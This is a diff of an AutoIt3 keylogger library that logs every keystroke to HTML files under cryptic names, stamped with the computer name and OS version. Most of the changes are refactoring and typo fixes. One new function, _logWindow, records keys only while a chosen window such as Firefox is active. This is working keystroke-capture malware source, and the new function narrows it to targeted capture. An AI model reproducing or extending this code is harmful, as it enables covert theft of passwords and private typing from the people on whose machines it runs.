@@ -24,38 +24,39 @@
 ; OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 ; THE SOFTWARE.
 
-; This AutoIt3-Script can be used to produce easy to read HTML-Files which contain 
+; This AutoIt3 can be used to produce easy to read HTML-Files which contain 
 ; the output of a keylogger.
 
-; Initializes the HTML-File and all global Variables
-Func _init($path)
-	Global $key = ""		; The pressed Key
-	Global $last = ""		; The pressed Key in the last iteration
-	Global $pressed = False	; A boolean to indicate wether a key was pressed in an iteration
-	$Date=@mday&"."&@mon&"."&@year
-	$Time=@hour&":"&@min&":"&@sec
-	Global $FileOpen = FileOpen($path&"\"&@hour+@mon&"_"&@min*2&"_"&@sec*@year&".html", 1) ; The filename needed to be a bit cryptic in case you have more than one in the same location
-	FileWrite($FileOpen, '<!DOCTYPE html><head><title>Keylogger-Output</title><style type="text/css">body{font-size:20px;}sc{color: red;font-size:80%;}h1{color: blue;}h3{color: blue;}</style></head><body>' & @CRLF)
-	FileWrite($FileOpen,  "<h1>" & @ComputerName & " on " & @OSVersion & "</h1><h3>Date: " & $Date & "<br>Time: " & $Time & "</h3>" & @CRLF)
- EndFunc
+; By including the script, some global variables will be set automatically
+Global $key = ""			; The pressed Key
+Global $last = ""			; The pressed Key in the last iteration
+Global $pressed = False		; A boolean to indicate whether a key was pressed in an iteration
+Opt("WinTitleMatchMode", 2) ; Setting the WinTitleMatchMode for window-logging
 
- ; Initializes the HTML-File with a specified name and all global Variables
- Func _initWithFilename($path, $filename)
-	Global $key = ""		; The pressed Key
-	Global $last = ""		; The pressed Key in the last iteration
-	Global $pressed = False	; A boolean to indicate wether a key was pressed in an iteration
+; Initializes the HTML-File
+Func _init($path)
 	$Date=@mday&"."&@mon&"."&@year
 	$Time=@hour&":"&@min&":"&@sec
-	Global $FileOpen = FileOpen($path&"\"&$filename&".html", 1) ; The file
-	FileWrite($FileOpen, '<!DOCTYPE html><head><title>Keylogger-Output</title><style type="text/css">body{font-size:20px;}sc{color: red;font-size:80%;}h1{color: blue;}h3{color: blue;}</style></head><body>' & @CRLF)
-	FileWrite($FileOpen,  "<h1>" & @ComputerName & " on " & @OSVersion & "</h1><h3>Date: " & $Date & "<br>Time: " & $Time & "</h3>" & @CRLF)
+	Global $File = FileOpen($path&"\"&@hour+@mon&"_"&@min*2&"_"&@sec*@year&".html", 1) ; The filename needed to be a bit cryptic in case you have more than one in the same location
+	FileWrite($File, '<!DOCTYPE html><head><title>Keylogger-Output</title><style type="text/css">body{font-size:20px;}sc{color: red;font-size:80%;}h1{color: blue;}h3{color: blue;}</style></head><body>' & @CRLF)
+	FileWrite($File,  "<h1>" & @ComputerName & " on " & @OSVersion & "</h1><h3>Date: " & $Date & "<br>Time: " & $Time & "</h3>" & @CRLF)
 EndFunc
 
+; Initializes the HTML-File with a specified name and all global Variables
+Func _initWithFilename($path, $filename)
+	$Date=@mday&"."&@mon&"."&@year
+	$Time=@hour&":"&@min&":"&@sec
+	Global $File = FileOpen($path&"\"&$filename&".html", 1) ; The file
+	FileWrite($File, '<!DOCTYPE html><head><title>Keylogger-Output</title><style type="text/css">body{font-size:20px;}sc{color: red;font-size:80%;}h1{color: blue;}h3{color: blue;}</style></head><body>' & @CRLF)
+	FileWrite($File,  "<h1>" & @ComputerName & " on " & @OSVersion & "</h1><h3>Date: " & $Date & "<br>Time: " & $Time & "</h3>" & @CRLF)
+EndFunc
+
+; Writes the last key to the file
 Func _writeToFile()
 	If StringLen($key) > 1 Then	; If the String is longer than 1, the pressed key cannot be a letter or number. It has to be a special key
-		FileWrite($FileOpen, "<sc>_" & $key & "_</sc>") ; Special keys are surounded with the <sc> tag
+		FileWrite($File, "<sc>_" & $key & "_</sc>") ; Special keys are surrounded with the <sc> tag
 	Else
-		FileWrite($FileOpen, $key)
+		FileWrite($File, $key)
 	EndIF
 EndFunc
 
@@ -382,15 +383,15 @@ Func _getPressedKey()
 	EndIf
 
     ; If the key was a letter and the shift-key wasn't pressed, it will be lowered
-	if StringLen($key) < 2 Then
+	If StringLen($key) < 2 Then
 		If not _IsPressed('10') Then
 			$key = StringLower($key)
 		EndIf
 	 EndIf
 
-	 if StringCompare($key, "") Then $pressed = True ; Strangely "StringCompare" gives you a 0 (also interpreted as "False") when the strings match
+	If StringCompare($key, "") Then $pressed = True ; Strangely "StringCompare" gives you a 0 (also interpreted as "False") when the strings match
 
-	 EndFunc
+EndFunc
 
 ; Takes the key and writes it to the file
 Func _read()
@@ -402,9 +403,21 @@ Func _read()
    Sleep(40) ; Waiting just to keep the CPU-usage at a minimum
 EndFunc
 
-; A endless loop of reading (so the keylogger won't stop reading)
+; An endless loop of reading (so the keylogger won't stop reading)
 Func _run()
    While 1
 	   _read()
+	WEnd
+EndFunc
+
+; An endless loop of reading if a certain window is open
+; This only works if the parameter contains a string which is present in the actual window title (e.g. "Firefox" is a sufficient parameter because every Firefox-Window has the String "Firefox" in its title)
+Func _logWindow($title)
+	While 1
+		If WinActive($title) Then 
+			_read()
+		Else 
+			Sleep(40) 
+		EndIf
 	WEnd
 EndFunc
